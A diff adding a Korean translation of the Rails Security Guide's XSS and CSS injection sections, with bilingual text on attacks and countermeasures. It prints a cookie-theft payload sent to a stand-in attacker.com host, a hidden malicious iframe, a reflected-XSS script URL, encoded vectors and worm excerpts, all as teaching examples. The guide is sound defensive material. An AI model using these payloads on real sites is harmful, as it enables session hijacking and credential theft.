@@ -679,11 +679,11 @@ INFO: _웹어플리케이션에서 가장 광범위하게 퍼져 있고 가장 �
 
 가장 일반적인 진입점은 메시지 포스트, 사용자 댓글, 방명록이지만, 프로젝트 타이들, 문서명, 검색결과 페이지 역시 공격에 취약합니다. 사용자가 데이터를 입력할 수 있는 모든 곳이 공격 대상이 될 수 있습니다. 그러나 데이터 입력은 반드시 웹사이트의 입력창에서만 가능한 것이 아니라, 명시적이거나 숨겨졌거나 또는 내부에서 사용하는 어떠한 URL 파라미터를 통해서도 가능하다는 것입니다. 사용자는 어떠한 트래픽도 중간에서 가로챌 수 있다는 것을 기억해야 합니다. [Live HTTP Headers Firefox plugin](http://livehttpheaders.mozdev.org/)와 같은 어플리케이션이나 클라이언트측 프록시를 이용하면 쉽게 요청을 변경할 수 있습니다. [[[The most common entry points are message posts, user comments, and guest books, but project titles, document names and search result pages have also been vulnerable - just about everywhere where the user can input data. But the input does not necessarily have to come from input boxes on web sites, it can be in any URL parameter - obvious, hidden or internal. Remember that the user may intercept any traffic. Applications, such as the [Live HTTP Headers Firefox plugin](http://livehttpheaders.mozdev.org/), or client-site proxies make it easy to change requests.]]]
 
-XSS 공격은 다음과 같이 동작합니다. 공격자는 악성코드를 주입하고 웹어플리케이션은 그것을 저장한 후 웹 페이지상에 보여주게 됩니다. 결국 희생자에게 보여지게 되는 것입니다. 대부분의 XSS 사례는 단순히 경고창을 보여주지만 실제로는 매우 강력한 문제를 야기시키게 됩니다. XSS는 쿠키를 훔치고, 세션을 가로채고, 희생자를 가짜 웹사이트로 리디렉트시켜 공격자의 이득을 위해 만들어 놓은 광고에 노출되도록 합니다. 또한 웹사이트상의 엘리먼트를 변경해서 개인 정보를 빼내거나 웹브라우저의 보안구멍을 토해서 악성소프트웨어를 설치하기도 합니다. [[[XSS attacks work like this: An attacker injects some code, the web application saves it and displays it on a page, later presented to a victim. Most XSS examples simply display an alert box, but it is more powerful than that. XSS can steal the cookie, hijack the session, redirect the victim to a fake website, display advertisements for the benefit of the attacker, change elements on the web site to get confidential information or install malicious software through security holes in the web browser.]]]
+XSS 공격은 다음과 같이 동작합니다. 공격자는 악성코드를 주입하고, 웹어플리케이션은 그것을 저장한 후, 웹 페이지상에 보여주게 됩니다. 결국 사용자는 이 페이지를 보게 되는 것입니다. 대부분의 XSS 사례는 단순히 경고창을 보여주지만 실제로는 매우 강력한 문제를 야기시키게 됩니다. XSS는 쿠키를 훔치고, 세션을 가로채고, 사용자를 가짜 웹사이트로 리디렉트시켜 공격자의 이득을 위해 만들어 놓은 광고에 노출되도록 합니다. 또한 웹사이트 상의 엘리먼트를 변경해서 개인 정보를 빼내거나 웹브라우저의 보안구멍을 통해서 악성소프트웨어를 설치하기도 합니다. [[[XSS attacks work like this: An attacker injects some code, the web application saves it and displays it on a page, later presented to a victim. Most XSS examples simply display an alert box, but it is more powerful than that. XSS can steal the cookie, hijack the session, redirect the victim to a fake website, display advertisements for the benefit of the attacker, change elements on the web site to get confidential information or install malicious software through security holes in the web browser.]]]
 
 2007년 후반기 동안, 모질라 브라우저에서는 88개, 사파리 22개, IE 18개, 오페라 12개의 취약성이 발견되었습니다. [Symantec Global Internet Security threat report](http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf)에서는 2007년 후반기에 239개의 브라우저 플러그인 취약성을 보고한 바도 있습니다. [Mpack](http://pandalabs.pandasecurity.com/mpack-uncovered/)은 이러한 취약성을 악용하는 매우 활발한 최신의 공격 프레임워크입니다. 범죄를 저지르는 해커들에게는, 웹어플리케이션 프레임워크 상의 SQL 주입 취약성을 악용해서 모든 텍스트 테이블 컬럼에 악성 코드를 삽입할 수 있다는 것은 매우 매력적인 것입니다. 2008년 4월, 51만개의 사이트가 이와 같은 공격을 당했는데, 이중에는 영국 정부, 유엔, 그 외 많은 주요 기관들이 포함되어 있습니다. [[[During the second half of 2007, there were 88 vulnerabilities reported in Mozilla browsers, 22 in Safari, 18 in IE, and 12 in Opera. The [Symantec Global Internet Security threat report](http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf) also documented 239 browser plug-in vulnerabilities in the last six months of 2007. [Mpack](http://pandalabs.pandasecurity.com/mpack-uncovered/) is a very active and up-to-date attack framework which exploits these vulnerabilities. For criminal hackers, it is very attractive to exploit an SQL-Injection vulnerability in a web application framework and insert malicious code in every textual table column. In April 2008 more than 510,000 sites were hacked like this, among them the British government, United Nations, and many more high targets.]]]
 
-진입점의 비교적 새롭지만 드문 형태는 배너 광고입니다. 2008년초, [Trend Micro](http://blog.trendmicro.com/myspace-excite-and-blick-serve-up-malicious-banner-ads/)에 의하면, 악성코드가 MySapce와 Excite와 같은 유명 사이트에 있는 배너 광고에 나타났습니다. [[[A relatively new, and unusual, form of entry points are banner advertisements. In earlier 2008, malicious code appeared in banner ads on popular sites, such as MySpace and Excite, according to [Trend Micro](http://blog.trendmicro.com/myspace-excite-and-blick-serve-up-malicious-banner-ads/).]]]
+비교적 새롭지만 드문 형태의 진입점은 배너 광고입니다. 2008년초, [Trend Micro](http://blog.trendmicro.com/myspace-excite-and-blick-serve-up-malicious-banner-ads/)에 의하면, 악성코드가 MySapce와 Excite와 같은 유명 사이트에 있는 배너 광고에서 나타났습니다. [[[A relatively new, and unusual, form of entry points are banner advertisements. In earlier 2008, malicious code appeared in banner ads on popular sites, such as MySpace and Excite, according to [Trend Micro](http://blog.trendmicro.com/myspace-excite-and-blick-serve-up-malicious-banner-ads/).]]]
 
 #### [HTML/JavaScript Injection] HTML/자바스크립트 주입
 
@@ -704,13 +704,13 @@ XSS를 체크할 수 가장 손쉬운 테스트가 아래 소개되어 있습니
 
 ##### [Cookie Theft] 쿠기 도둑
 
-이상에서 보여준 예제 코드는 현재상태에서는 전혀 피해를 주지 않지만, 공격자가 사용자의 쿠키를 훔쳐서 세션을 가로채는 방법을 알아 보겠습니다. 자바스크립트에서, document.cookie 속성을 이용해서 문서의 쿠키를 읽고 쓸수 있습니다. 자바스크립트는 same origin policy를 강제하는데, 특정 도메인의 스크립트는 다른 도메인의 쿠키를 접근할 수 없다는 것을 의미합니다. document.cookie 속성은 페이지를 응답으로 보낸 웹서버의 쿠키값을 가지고 있습니다. 그러나, XSS에서 일어나는 것 처럼, HTML 문서내에 스크립트 코드를 직접 삽입해 둘 경우 이 속성값을 읽고 쓸수 있게 됩니다. 결과 페이지에 쿠키값을 보고 싶을 때는 웹어플리케이션내의 아무곳에 아래의 코드를 주입해 주면 됩니다. [[[These examples don't do any harm so far, so let's see how an attacker can steal the user's cookie (and thus hijack the user's session). In JavaScript you can use the document.cookie property to read and write the document's cookie. JavaScript enforces the same origin policy, that means a script from one domain cannot access cookies of another domain. The document.cookie property holds the cookie of the originating web server. However, you can read and write this property, if you embed the code directly in the HTML document (as it happens with XSS). Inject this anywhere in your web application to see your own cookie on the result page:]]]
+이상에서 보여준 예제 코드는 현재 상태에서는 전혀 피해를 주지 않았지만, 이제는 공격자가 사용자의 쿠키를 훔쳐서 세션을 가로채는 방법을 알아 보겠습니다. 자바스크립트에서는 document.cookie 속성을 이용해서 문서의 쿠키를 읽고 쓸수 있습니다. 자바스크립트는 same origin policy를 강제하는데, 특정 도메인의 스크립트는 다른 도메인의 쿠키를 접근할 수 없다는 것을 의미합니다. document.cookie 속성은 페이지를 응답으로 보낸 웹서버의 쿠키값을 가지고 있습니다. 그러나, XSS에서 일어나는 것처럼, HTML 문서내에 스크립트 코드를 직접 삽입해 둘 경우 이 속성값을 읽고 쓸수 있게 됩니다. 결과 페이지에서 쿠키값을 보고 싶을 때는 웹어플리케이션내의 아무곳에 아래의 코드를 주입해 주면 됩니다. [[[These examples don't do any harm so far, so let's see how an attacker can steal the user's cookie (and thus hijack the user's session). In JavaScript you can use the document.cookie property to read and write the document's cookie. JavaScript enforces the same origin policy, that means a script from one domain cannot access cookies of another domain. The document.cookie property holds the cookie of the originating web server. However, you can read and write this property, if you embed the code directly in the HTML document (as it happens with XSS). Inject this anywhere in your web application to see your own cookie on the result page:]]]
 
 ```
 <script>document.write(document.cookie);</script>
 ```
 
-물론 공격자들에게는 희생자가 자신의 쿠키값을 볼 것이기 때문에 이와 같은 스크립트 코드는 유용하지 않습니다. 아래의 예제 코드는 http://www.attacker.com/ 주소에 쿠키값을 조합한 URL로부터 아미지를 로드하려고 시도할 것입니다. 물론, 이 URL은 존재하지 않기 때문에 브라우저상에 아무것도 보여 주지 않게 됩니다. 그러나 공격자는 자신의 웹서버의 접근 로그 파일에서 희생자의 쿠키값을 알 수 있게 됩니다. [[[For an attacker, of course, this is not useful, as the victim will see his own cookie. The next example will try to load an image from the URL http://www.attacker.com/ plus the cookie. Of course this URL does not exist, so the browser displays nothing. But the attacker can review his web server's access log files to see the victim's cookie.]]]
+물론 공격자들에게는 희생자가 자신의 쿠키값을 볼 것이기 때문에 이와 같은 스크립트 코드는 유용하지 않습니다. 아래의 예제 코드는 http://www.attacker.com/ 주소에 쿠키값을 조합한 URL로부터 이미지를 로드하려고 시도할 것입니다. 물론, 이 URL은 존재하지 않기 때문에 브라우저상에 아무것도 보이지 않게 됩니다. 그러나 공격자는 자신의 웹서버의 접근 로그 파일에서 희생자의 쿠키값을 알 수 있게 됩니다. [[[For an attacker, of course, this is not useful, as the victim will see his own cookie. The next example will try to load an image from the URL http://www.attacker.com/ plus the cookie. Of course this URL does not exist, so the browser displays nothing. But the attacker can review his web server's access log files to see the victim's cookie.]]]
 
 ```html
 <script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
@@ -722,66 +722,67 @@ www.attacker.com 의 로그파일에서 아래와 같은 내용을 알 수 있�
 GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
 ```
 
-[httpOnly](http://dev.rubyonrails.org/ticket/8895) 플래그를 쿠키에 추가해 주는 거와 같은 확실한 조치를 취하면 이러한 공격을 줄일 수 있는데 document.cookie는 자바스크립트가 읽을 수 없게 될 수 있습니다. Http only 쿠키는 IE v6.SP1, 파이어폭스 v2.0.0.5, 오페라 9.5 에서 사용하고 있지만 사파리는 여전히 고려 중에 있고 해당 옵션을 무시해 버립니다. 그러나 WebTV와 IE 5.5 on Mac 과 같은 다른 구버전의 브라우저들은 실제로 해당 페이지를 로드하지 못할 수 있습니다. 그러나 쿠키는 [Ajax를 이용할 경우 여전히 보일 수 있기 때문](http://ha.ckers.org/blog/20070719/firefox-implements-httponly-and-is-vulnerable-to-xmlhttprequest/)에 주의가 필요합니다. [[[You can mitigate these attacks (in the obvious way) by adding the [httpOnly](http://dev.rubyonrails.org/ticket/8895) flag to cookies, so that document.cookie may not be read by JavaScript. Http only cookies can be used from IE v6.SP1, Firefox v2.0.0.5 and Opera 9.5. Safari is still considering, it ignores the option. But other, older browsers (such as WebTV and IE 5.5 on Mac) can actually cause the page to fail to load. Be warned that cookies [will still be visible using Ajax](http://ha.ckers.org/blog/20070719/firefox-implements-httponly-and-is-vulnerable-to-xmlhttprequest/), though.]]]
+[httpOnly](http://dev.rubyonrails.org/ticket/8895) 플래그를 쿠키에 추가해 주는 것과 같이 확실한 조치를 취해주면 이러한 공격을 줄일 수 있는데, 이렇게 하면 자바스크립트가 document.cookie를 읽을 수 없게 될 수 있습니다. Http only 쿠키는 IE v6.SP1, 파이어폭스 v2.0.0.5, 오페라 9.5 에서 사용하고 있지만, 사파리는 여전히 고려 중에 있고 해당 옵션을 무시해 버립니다. 그러나 WebTV와 IE 5.5 on Mac 과 같은 다른 구버전의 브라우저들은 실제로 해당 페이지를 로드하지 못할 수 있습니다. 그러나 쿠키는 [Ajax를 이용할 경우 여전히 보일 수 있기 때문](http://ha.ckers.org/blog/20070719/firefox-implements-httponly-and-is-vulnerable-to-xmlhttprequest/)에 주의가 필요합니다. [[[You can mitigate these attacks (in the obvious way) by adding the [httpOnly](http://dev.rubyonrails.org/ticket/8895) flag to cookies, so that document.cookie may not be read by JavaScript. Http only cookies can be used from IE v6.SP1, Firefox v2.0.0.5 and Opera 9.5. Safari is still considering, it ignores the option. But other, older browsers (such as WebTV and IE 5.5 on Mac) can actually cause the page to fail to load. Be warned that cookies [will still be visible using Ajax](http://ha.ckers.org/blog/20070719/firefox-implements-httponly-and-is-vulnerable-to-xmlhttprequest/), though.]]]
 
-##### Defacement
+##### [Defacement] 파손
 
-With web page defacement an attacker can do a lot of things, for example, present false information or lure the victim on the attackers web site to steal the cookie, login credentials or other sensitive data. The most popular way is to include code from external sources by iframes:
+웹페이지가 보안상 뚫리게 되면, 공격자가 많은 작업을 할 수 있게 됩니다. 예를 들면, 거짓 정보를 제공해 주고, 사용자를 공격자의 웹사이트로 유인해서 쿠키, 로그인 정보 또는 다른 개인정보를 훔칠 수 있습니다. 가장 일반적인 방법은 iframe을 이용해서 외부 소스로부터 코드를 포함하는 것입니다. [[[With web page defacement an attacker can do a lot of things, for example, present false information or lure the victim on the attackers web site to steal the cookie, login credentials or other sensitive data. The most popular way is to include code from external sources by iframes:]]]
 
 ```html
 <iframe name="StatPage" src="http://58.xx.xxx.xxx" width=5 height=5 style="display:none"></iframe>
 ```
 
-This loads arbitrary HTML and/or JavaScript from an external source and embeds it as part of the site. This iframe is taken from an actual attack on legitimate Italian sites using the [Mpack attack framework](http://isc.sans.org/diary.html?storyid=3015). Mpack tries to install malicious software through security holes in the web browser - very successfully, 50% of the attacks succeed.
+이로써 임의의 HTML이나 자바스크립트가 외로 소스로부터 로드되어 사이트의 일부로 임베드됩니다. 이 iframe은 [Mpack attack framework](http://isc.sans.org/diary.html?storyid=3015)
+를 이용해서 합법적인 이태리 사이트에 대한 실제 공격으로부터 삽입된 것입니다. Mpack은 웹브라우저의 보안구멍을 통해서 악성 소프트웨어를 설치하려고 시도합니다. 이러한 공격은 매우 성공적으로 진행되어, 50% 정도의 성공율을 보입니다. [[[This loads arbitrary HTML and/or JavaScript from an external source and embeds it as part of the site. This iframe is taken from an actual attack on legitimate Italian sites using the [Mpack attack framework](http://isc.sans.org/diary.html?storyid=3015). Mpack tries to install malicious software through security holes in the web browser - very successfully, 50% of the attacks succeed.]]]
 
-A more specialized attack could overlap the entire web site or display a login form, which looks the same as the site's original, but transmits the user name and password to the attacker's site. Or it could use CSS and/or JavaScript to hide a legitimate link in the web application, and display another one at its place which redirects to a fake web site.
+더 특별한 공격의 경우는 전체 웹사이트를 공격자의 사이트로 겹치게 하거나, 원래의 사이트와 똑같은 로그인 폼을 보여주지만 사용자이름과 비밀번호를 공격자의 사이트로 전송하도록 할 수 있습니다. 또는 CSS와 자바스크립트를 이용해서 웹어플리케이션에 있는 원래의 링크를 감춰버리고 가짜 웹사이트로 리디렉트하는 다른 링크로 대신 보이게 할 수도 있을 것입니다. [[[A more specialized attack could overlap the entire web site or display a login form, which looks the same as the site's original, but transmits the user name and password to the attacker's site. Or it could use CSS and/or JavaScript to hide a legitimate link in the web application, and display another one at its place which redirects to a fake web site.]]]
 
-Reflected injection attacks are those where the payload is not stored to present it to the victim later on, but included in the URL. Especially search forms fail to escape the search string. The following link presented a page which stated that "George Bush appointed a 9 year old boy to be the chairperson...":
+"reflected" 주입공격은 악성코드가 사용자에게 나중에도 지속적으로 보여주기 위해서 저장되지 않고 URL에만 포함되는 방식입니다. 특히, 검색 폼은 검색 문자열을 이스케이핑하지 못합니다. 아래의 링크는 "George Bush appointed a 9 year old boy to be the chairperson..."로 기술된 페이지를 보여 줍니다. [[[Reflected injection attacks are those where the payload is not stored to present it to the victim later on, but included in the URL. Especially search forms fail to escape the search string. The following link presented a page which stated that "George Bush appointed a 9 year old boy to be the chairperson...":]]]
 
 ```
 http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1-->
   <script src=http://www.securitylab.ru/test/sc.js></script><!--
 ```
 
-##### Countermeasures
+##### [Countermeasures] 대처방법
 
-_It is very important to filter malicious input, but it is also important to escape the output of the web application_.
+_악성 입력을 걸러내는 것이 매우 중요하지만 웹어플리케이션의 결과물을 이스케이핑하는 것 역시 중요합니다_. [[[_It is very important to filter malicious input, but it is also important to escape the output of the web application_.]]]
 
-Especially for XSS, it is important to do _whitelist input filtering instead of blacklist_. Whitelist filtering states the values allowed as opposed to the values not allowed. Blacklists are never complete.
+특히 XSS에 대처하기 위해서는, _블랙리스트 대신 화이트리스트 방식으로 입력을 필터하는 것이 중요합니다_. 화이트리스트 필터링이란 허용되지 않는 값에 반하여 허용되는 값만을 걸러내는 것을 말합니다. 블랙리스트는 결코 완벽할 수 없습니다. [[[Especially for XSS, it is important to do _whitelist input filtering instead of blacklist_. Whitelist filtering states the values allowed as opposed to the values not allowed. Blacklists are never complete.]]]
 
-Imagine a blacklist deletes "script" from the user input. Now the attacker injects "&lt;scrscriptipt&gt;", and after the filter, "&lt;script&gt;" remains. Earlier versions of Rails used a blacklist approach for the strip_tags(), strip_links() and sanitize() method. So this kind of injection was possible:
+특정 블랙리스트가 사용자의 입력으로부터 "script"라는 단어를 삭제한다고 가정해 보겠습니다. 이 때 공격자가 "&lt;scrscriptipt&gt;" 라는 문자열을 주입하고 이에 대해서 블랙리스트가 필터를 적용하면 이후에도 "&lt;script&gt;" 문자열이 남게되는 결과를 초래하게 됩니다. 레일스의 초기버전에서는 strip_tags(), strip_links(), sanitize() 메소드에 대해서 블랙리스트 접근법을 사용했었습니다. [[[Imagine a blacklist deletes "script" from the user input. Now the attacker injects "&lt;scrscriptipt&gt;", and after the filter, "&lt;script&gt;" remains. Earlier versions of Rails used a blacklist approach for the strip_tags(), strip_links() and sanitize() method. So this kind of injection was possible:]]]
 
 ```ruby
 strip_tags("some<<b>script>alert('hello')<</b>/script>")
 ```
 
-This returned "some&lt;script&gt;alert('hello')&lt;/script&gt;", which makes an attack work. That's why I vote for a whitelist approach, using the updated Rails 2 method sanitize():
+이것은 "some&lt;script&gt;alert('hello')&lt;/script&gt;"와 같은 값을 반환하게 되어 공격이 작동하는 결과를 낳게 되는 것입니다. 바로 이것이 업데이트된 레일스 2의 sanitize() 메소드를 이용할 때, 화이트리스트 방식에 대한 찬성표를 던지게 하는 이유입니다. [[[This returned "some&lt;script&gt;alert('hello')&lt;/script&gt;", which makes an attack work. That's why I vote for a whitelist approach, using the updated Rails 2 method sanitize():]]]
 
 ```ruby
 tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
 s = sanitize(user_input, tags: tags, attributes: %w(href title))
 ```
 
-This allows only the given tags and does a good job, even against all kinds of tricks and malformed tags.
+이것은 주어진 태그들만 허용하는데, 온갖 트릭과 악성 태그에 대해서도 잘 동작합니다. [[[This allows only the given tags and does a good job, even against all kinds of tricks and malformed tags.]]]
 
-As a second step, _it is good practice to escape all output of the application_, especially when re-displaying user input, which hasn't been input-filtered (as in the search form example earlier on). _Use `escapeHTML()` (or its alias `h()`) method_ to replace the HTML input characters &amp;, &quot;, &lt;, &gt; by their uninterpreted representations in HTML (`&amp;`, `&quot;`, `&lt`;, and `&gt;`). However, it can easily happen that the programmer forgets to use it, so _it is recommended to use the [SafeErb](http://safe-erb.rubyforge.org/svn/plugins/safe_erb/) plugin_. SafeErb reminds you to escape strings from external sources.
+두번째 단계로, _어플리케이션의 모든 출력물을 이스케이핑하는 습관을 들이는 것이 좋습니다_. 특히, 이전 예에 예로 든 검색폼에서와 같이 입력값을 필터하지 않은 경우, 사용자 입력값을 다시 보여줄 때 이러한 작업을 추가해 주어야 합니다. _`escapeHTML()` (또는 다름 이름인 `h()`) 메소드를 이용하면_, HTML (`&amp;`, `&quot;`, `&lt`;, and `&gt;`)로 해독되지 않은 형태로 HTML 입력 문자들(&amp;, &quot;, &lt;, &gt;)을 교체해 줄 수 있습니다. 그러나, 개발자가 이 메소드를 사용하는 것을 쉽게 기억하지 못할 수 있어서, _[SafeErb](http://safe-erb.rubyforge.org/svn/plugins/safe_erb/) 플러그인을 사용할 것을 권해 드립니다_. SafeErb는 외부소스로 부터 오는 문자열을 이스케이핑하는 것을 개발자에게 상기시켜 줍니다. [[[As a second step, _it is good practice to escape all output of the application_, especially when re-displaying user input, which hasn't been input-filtered (as in the search form example earlier on). _Use `escapeHTML()` (or its alias `h()`) method_ to replace the HTML input characters &amp;, &quot;, &lt;, &gt; by their uninterpreted representations in HTML (`&amp;`, `&quot;`, `&lt`;, and `&gt;`). However, it can easily happen that the programmer forgets to use it, so _it is recommended to use the [SafeErb](http://safe-erb.rubyforge.org/svn/plugins/safe_erb/) plugin_. SafeErb reminds you to escape strings from external sources.]]]
 
-##### Obfuscation and Encoding Injection
+##### [Obfuscation and Encoding Injection] 코드난독화와 인코딩 주입
 
-Network traffic is mostly based on the limited Western alphabet, so new character encodings, such as Unicode, emerged, to transmit characters in other languages. But, this is also a threat to web applications, as malicious code can be hidden in different encodings that the web browser might be able to process, but the web application might not. Here is an attack vector in UTF-8 encoding:
+네트워크 트래픽은 주로 제한적인 서양 알파벳문자에 근거하고 있어서 다른 언어로 된 문자를 전송하기 위해서 유니코드와 같은 새로운 문자 인코딩이 출현하게 되었습니다. 그러나, 이것은 웹어플리케이션에게는 또한 위협적인 일이 됩니다. 즉, 웹브라우저는 처리하더라도 웹어플리케이션이 처리하지 못할 수 있는 다른 인코딩에서는 악성코드가  감춰질 수 있습니다. 아래에 UTF-8 인코딩에서 공격이 작동하는 코드 예를 보여 줍니다. [[[Network traffic is mostly based on the limited Western alphabet, so new character encodings, such as Unicode, emerged, to transmit characters in other languages. But, this is also a threat to web applications, as malicious code can be hidden in different encodings that the web browser might be able to process, but the web application might not. Here is an attack vector in UTF-8 encoding:]]]
 
 ```
 <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;
   &#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
 ```
 
-This example pops up a message box. It will be recognized by the above sanitize() filter, though. A great tool to obfuscate and encode strings, and thus "get to know your enemy", is the [Hackvertor](https://hackvertor.co.uk/public). Rails' sanitize() method does a good job to fend off encoding attacks.
+이 예는 메시지 박스를 팝업으로 보여 줍니다. 그러나 위에서 언급했던 sanitize() 필터가 인식하게 될 것입니다. [Hackvertor](https://hackvertor.co.uk/public)는, 문자열을 읽기 어렵게 만들고 인코딩하는, 그래서 "적을 알게 되는", 훌륭한 툴입니다. 레일스의 sanitize() 메소드는 이러한 인코딩 공격을 훌륭하게 막아 줍니다. [[[This example pops up a message box. It will be recognized by the above sanitize() filter, though. A great tool to obfuscate and encode strings, and thus "get to know your enemy", is the [Hackvertor](https://hackvertor.co.uk/public). Rails' sanitize() method does a good job to fend off encoding attacks.]]]
 
-#### Examples from the Underground
+#### [Examples from the Underground] 사례
 
-_In order to understand today's attacks on web applications, it's best to take a look at some real-world attack vectors._
+_웹어플리케이션에 대한 오늘날 공격형태를 이해하기 위해서는, 몇가지 실제 공격매체를 살펴보는 것이 가장 좋습니다._ [[[_In order to understand today's attacks on web applications, it's best to take a look at some real-world attack vectors._]]]
 
-The following is an excerpt from the [Js.Yamanner@m](http://www.symantec.com/security_response/writeup.jsp?docid=2006-061211-4111-99&tabid=1) Yahoo! Mail [worm](http://groovin.net/stuff/yammer.txt). It appeared on June 11, 2006 and was the first webmail interface worm:
+아래는 [Js.Yamanner@m](http://www.symantec.com/security_response/writeup.jsp?docid=2006-061211-4111-99&tabid=1) Yahoo! Mail [worm](http://groovin.net/stuff/yammer.txt) 에서 발췌한 것입니다. 2006년 6월 11일 발견되었고 최초의 웹메일 인터페이스 웜이였습니다. [[[The following is an excerpt from the [Js.Yamanner@m](http://www.symantec.com/security_response/writeup.jsp?docid=2006-061211-4111-99&tabid=1) Yahoo! Mail [worm](http://groovin.net/stuff/yammer.txt). It appeared on June 11, 2006 and was the first webmail interface worm:]]]
 
 ```
 <img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'
@@ -789,96 +790,96 @@ The following is an excerpt from the [Js.Yamanner@m](http://www.symantec.com/sec
   var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...
 ```
 
-The worms exploits a hole in Yahoo's HTML/JavaScript filter, which usually filters all target and onload attributes from tags (because there can be JavaScript). The filter is applied only once, however, so the onload attribute with the worm code stays in place. This is a good example why blacklist filters are never complete and why it is hard to allow HTML/JavaScript in a web application.
+이 웜들은 야후의 HTML/자바스크립트 필터상에 구멍을 악용하게 되는데, 대개 이러한 필터는 모든 대상과 (자바스크립트도 있을 수 있기 때문에) 태그로부터의 onload 속성을 걸러주게 됩니다. 그러나 필터는 단 한번만 적용되기 때문에 웜코드가 있는 상태로 onload 속성이 그대로 유지됩니다. 바로 이것이 블랙리스트 필터가 결코 완전할 수 없는 이유에 해당하고, 왜 웹어플리케이션 상에 HTML/자바스크립트를 허용하는 것이 어려운 일인지를 잘 설명해 줍니다. [[[The worms exploits a hole in Yahoo's HTML/JavaScript filter, which usually filters all target and onload attributes from tags (because there can be JavaScript). The filter is applied only once, however, so the onload attribute with the worm code stays in place. This is a good example why blacklist filters are never complete and why it is hard to allow HTML/JavaScript in a web application.]]]
 
-Another proof-of-concept webmail worm is Nduja, a cross-domain worm for four Italian webmail services. Find more details on [Rosario Valotta's paper](http://www.xssed.com/news/37/Nduja_Connection_A_cross_webmail_worm_XWW/). Both webmail worms have the goal to harvest email addresses, something a criminal hacker could make money with.
+개념증명을 위한 또 다른 웹메일 웜은, 4개의 이태리 웹메일 서비스에 대한 도메인간 웜인 Nduja 입니다. 더 자세한 내용은 [Rosario Valotta's paper](http://www.xssed.com/news/37/Nduja_Connection_A_cross_webmail_worm_XWW/)을 참고하기 바랍니다. 위에서 언급한 두개의 웹메일 웜은 해커들의 돈벌이가 될 만한 것, 즉, 이메일 주소를 수집하는 것이 목적입니다. [[[Another proof-of-concept webmail worm is Nduja, a cross-domain worm for four Italian webmail services. Find more details on [Rosario Valotta's paper](http://www.xssed.com/news/37/Nduja_Connection_A_cross_webmail_worm_XWW/). Both webmail worms have the goal to harvest email addresses, something a criminal hacker could make money with.]]]
 
-In December 2006, 34,000 actual user names and passwords were stolen in a [MySpace phishing attack](http://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html). The idea of the attack was to create a profile page named "login_home_index_html", so the URL looked very convincing. Specially-crafted HTML and CSS was used to hide the genuine MySpace content from the page and instead display its own login form.
+2006년 12월에는, 34,000명의 사용자 이름과 비밀번호가 [MySpace phishing attack](http://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html)로 도난 당했습니다. 이 공격의 방법은 "login_home_index_html" 이라는 프로필 페이지를 만드는 것이었고, URL은 보기에 매우 신빙성이 있어 보였습니다. 특수한 코딩 작업을 해 놓은 HTML과 CSS를 이용해서 페이지로부터 진짜 MySpace 내용은 감춰버리고 대신에 해커들이 만든 로그인 폼을 보이도록 했습니다. [[[In December 2006, 34,000 actual user names and passwords were stolen in a [MySpace phishing attack](http://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html). The idea of the attack was to create a profile page named "login_home_index_html", so the URL looked very convincing. Specially-crafted HTML and CSS was used to hide the genuine MySpace content from the page and instead display its own login form.]]]
 
-The MySpace Samy worm will be discussed in the CSS Injection section.
+MySpace Samy 웜은 CSS 주입 섹션에서 언급할 것입니다. [[[The MySpace Samy worm will be discussed in the CSS Injection section.]]]
 
-### CSS Injection
+### [CSS Injection] CSS 주입
 
-INFO: _CSS Injection is actually JavaScript injection, because some browsers (IE, some versions of Safari and others) allow JavaScript in CSS. Think twice about allowing custom CSS in your web application._
+INFO: _CSS 주입은 실제로는 자바스크립트 주입이라할 수 있는데, IE, 사파리의 몇몇 버전, 그리고 기타 브라우저에서는 CSS내에서 자바스크립트를 허용하기 때문입니다. 따라서 웹어플리케이션에서 커스텀 CSS를 허용하는 문제는 두번 생각을 해야 합니다._ [[[_CSS Injection is actually JavaScript injection, because some browsers (IE, some versions of Safari and others) allow JavaScript in CSS. Think twice about allowing custom CSS in your web application._]]]
 
-CSS Injection is explained best by a well-known worm, the [MySpace Samy worm](http://namb.la/popular/tech.html). This worm automatically sent a friend request to Samy (the attacker) simply by visiting his profile. Within several hours he had over 1 million friend requests, but it creates too much traffic on MySpace, so that the site goes offline. The following is a technical explanation of the worm.
+CSS 주입은 잘 알려진 웜인, [MySpace Samy worm](http://namb.la/popular/tech.html)를 예로 들면 잘 설명할 수 있습니다. 이 웜은 단지 Samy(공격자)의 프로필을 방문하는 것 만으로도 Samy에게 친구요청을 자동으로 보내게 됩니다. 수시간내에 1억개 이상의 친구요청을 받게 되어 MySpace에 대해 엄청난 트래픽을 유발하게 됩니다. 그래서 곧 이 사이트는 접속이 차단됩니다. 아래는 이 웜에 대한 기술적인 설명입니다. [[[CSS Injection is explained best by a well-known worm, the [MySpace Samy worm](http://namb.la/popular/tech.html). This worm automatically sent a friend request to Samy (the attacker) simply by visiting his profile. Within several hours he had over 1 million friend requests, but it creates too much traffic on MySpace, so that the site goes offline. The following is a technical explanation of the worm.]]]
 
-MySpace blocks many tags, however it allows CSS. So the worm's author put JavaScript into CSS like this:
+MySpace는 많은 수의 태그를 블록하지만, CSS는 허용합니다. 그래서 웜을 만든 사람은 자바스크립트를 아래와 같이 CSS로 삽입할 수 있습니다. [[[MySpace blocks many tags, however it allows CSS. So the worm's author put JavaScript into CSS like this:]]]
 
 ```html
 <div style="background:url('javascript:alert(1)')">
 ```
 
-So the payload is in the style attribute. But there are no quotes allowed in the payload, because single and double quotes have already been used. But JavaScript has a handy eval() function which executes any string as code.
